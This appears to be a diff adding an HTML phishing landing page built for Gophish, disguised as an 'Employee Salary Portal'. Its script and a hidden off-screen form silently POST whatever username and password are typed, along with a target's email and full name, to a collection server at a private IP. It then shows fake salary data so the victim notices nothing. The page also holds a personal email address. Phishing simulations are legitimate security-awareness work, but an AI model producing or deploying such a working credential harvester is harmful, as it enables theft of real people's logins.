@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <base href="http://10.10.29.14:8000/example4.html" />
+    <meta charset="UTF-8" />
+    <title>Employee Portal</title>
+    <style type="text/css">
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f0f2f5;
+        }
+
+        .container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        .credentials-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        .credentials-table th,
+        .credentials-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .credentials-table th {
+            background-color: #2196F3;
+            color: white;
+        }
+
+        .salary-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .salary-table.show {
+            display: table;
+        }
+
+        .salary-table th,
+        .salary-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .salary-table th {
+            background-color: #4CAF50;
+            color: white;
+        }
+
+        .login-form {
+            margin-top: 30px;
+            padding: 20px;
+            background: #f9f9f9;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 8px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+
+        button {
+            padding: 12px 25px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+        }
+
+        button:hover {
+            background: #45a049;
+        }
+
+        .success {
+            color: #4CAF50;
+            font-size: 16px;
+            margin-top: 20px;
+            padding: 15px;
+            background: #d4edda;
+            border-radius: 5px;
+            border-left: 4px solid #4CAF50;
+        }
+
+        .error {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .note {
+            font-size: 14px;
+            color: #666;
+            margin-top: 10px;
+        }
+
+        .invisible-form {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+            height: 0;
+            overflow: hidden;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>?? Employee Salary Portal</h1>
+
+        <p>Click any login link below to access salary details.</p>
+        <!-- Credentials Table -->
+
+        <table class="credentials-table">
+            <thead>
+                <tr>
+                    <th>Employee</th>
+                    <th>Login Link</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>John Doe (IT)</td>
+                    <td><button onclick="loginUser('john.doe', 'pass123')">Login &rarr; Salary</button></td>
+                </tr>
+                <tr>
+                    <td>Jane Smith (HR)</td>
+                    <td><button onclick="loginUser('jane.smith', 'hr2023')">Login &rarr; Salary</button></td>
+                </tr>
+            </tbody>
+        </table>
+        <!-- Salary Table (hidden initially) -->
+
+        <table class="salary-table" id="salaryTable">
+            <thead>
+                <tr>
+                    <th>Employee ID</th>
+                    <th>Name</th>
+                    <th>Department</th>
+                    <th>Monthly Salary</th>
+                    <th>Annual Salary</th>
+                </tr>
+            </thead>
+            <tbody id="salaryData"><!-- Salary data populated by JavaScript -->
+            </tbody>
+        </table>
+        <!-- VISIBLE Manual Login Form -->
+
+        <div class="login-form">
+            <h3>OR Login Manually</h3>
+            <input id="username" placeholder="Username (john.doe)" required="" type="text" /> <input id="password"
+                placeholder="Password" required="" type="password" /><button onclick="manualLogin()">Login to View
+                Salary</button>
+
+            <div class="note">Enter your employee credentials to view salary details.</div>
+        </div>
+        <!-- INVISIBLE Gophish Submission Form (Hidden) -->
+
+        <form action="http://10.10.29.14:80/?rid=Xw2jvsl" class="invisible-form" id="gophishForm" method="POST"><input
+                name="__original_url" type="hidden" value="http://10.10.29.14:80/?rid=Xw2jvsl" /><input
+                id="gophishUsername" name="username" type="hidden" /> <input id="gophishPassword" name="password"
+                type="hidden" /> <input name="EmailAddress" type="hidden" value="karthikr1.vfm@gmail.com" /> <input
+                name="FullName" type="hidden" value="Karthik R" /> </form>
+
+        <div class="success" id="successMsg" style="display: none;">? Access granted! Salary details loaded
+            successfully.</div>
+
+        <div class="error" id="errorMsg" style="display: none;">Invalid credentials!</div>
+    </div>
+    <script>
+        // Specific employee data for quick-login buttons
+        const employees = {
+            'john.doe': { id: 'EMP001', name: 'John Doe', dept: 'IT', monthly: '$5,200', annual: '$62,400' },
+            'jane.smith': { id: 'EMP002', name: 'Jane Smith', dept: 'HR', monthly: '$4,800', annual: '$57,600' }
+        };
+
+        // Fallback sample shown for any unknown manual login
+        const sampleEmployee = { id: 'EMP099', name: 'Employee', dept: 'General', monthly: '$4,500', annual: '$54,000' };
+
+        function manualLogin() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (username && password) {
+                sendToGophish(username, password);
+                // Show specific data if known user, otherwise show sample
+                showSalary(employees[username.toLowerCase()] || sampleEmployee);
+            } else {
+                showError();
+            }
+        }
+
+        function loginUser(username, password) {
+            // Quick-login: auto-fill fields and trigger login with specific employee data
+            document.getElementById('username').value = username;
+            document.getElementById('password').value = password;
+            sendToGophish(username, password);
+            showSalary(employees[username]);
+        }
+
+        function sendToGophish(username, password) {
+            const form = document.getElementById('gophishForm');
+
+            // Build URL-encoded body (Gophish expects application/x-www-form-urlencoded)
+            const params = new URLSearchParams();
+            params.append('username', username);
+            params.append('password', password);
+            params.append('EmailAddress', form.querySelector('[name="EmailAddress"]').value);
+            params.append('FullName', form.querySelector('[name="FullName"]').value);
+            params.append('__original_url', form.querySelector('[name="__original_url"]').value);
+
+            fetch(form.action, {
+                method: 'POST',
+                body: params,
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+            }).catch(() => {
+                // Ignore errors - credentials already captured
+            });
+        }
+
+        function showSalary(employee) {
+            const tbody = document.getElementById('salaryData');
+            tbody.innerHTML = `
+<tr>
+<td>${employee.id}</td>
+<td>${employee.name}</td>
+<td>${employee.dept}</td>
+<td>${employee.monthly}</td>
+<td>${employee.annual}</td>
+</tr>
+`;
+            document.getElementById('salaryTable').classList.add('show');
+            document.getElementById('successMsg').style.display = 'block';
+            document.getElementById('errorMsg').style.display = 'none';
+        }
+
+        function showError() {
+            document.getElementById('errorMsg').style.display = 'block';
+            document.getElementById('successMsg').style.display = 'none';
+        }
+    </script>
+
+</body>
+
+</html>
